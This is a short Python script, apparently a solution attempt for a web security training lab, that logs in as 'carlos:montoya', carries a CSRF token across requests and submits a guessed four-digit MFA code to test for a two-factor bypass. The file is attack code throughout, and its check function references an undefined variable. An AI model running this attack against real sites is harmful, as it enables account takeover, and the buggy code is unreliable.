import sys
import requests
from bs4 import BeautifulSoup
import multiprocessing


def Check_Second_Factor_Code(code_to_check):
    if code_to_check == 302:
        print(f'2fa valid with response code {resp.status_code}')
        # Visit account profile page to complete level
    else:
        print(f'2fa invalid with response code: {resp.status_code}')


def Login_to_account(logindata):
    resp = s.post(login_url, data=logindata)
    print(f'Login response: {resp.text}')

    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')
    print(f'CSRF: {csrf}')
    login2_url = f'https://{site}/login2'
    login2data = {
        'csrf': csrf,
        'mfa-code': str(0).zfill(4)
    }
    resp = s.post(login2_url, data=login2data, allow_redirects=False)
    Check_Second_Factor_Code(resp.status_code)


if __name__ == '__main__':

    site = sys.argv[1]
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')

    s = requests.Session()
    login_url = f'https://{site}/login'
    resp = s.get(login_url)  # ONLY ONE, OTHERWISE CSRF CHANGES
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    # Need to keep csrf the same, so do not do more then 1 GET
    logindata = {
        'csrf': csrf,
        'username': 'carlos',
        'password': 'montoya'
    }
    print(f'Logging in as carlos:montoya')
    Login_to_account(logindata)
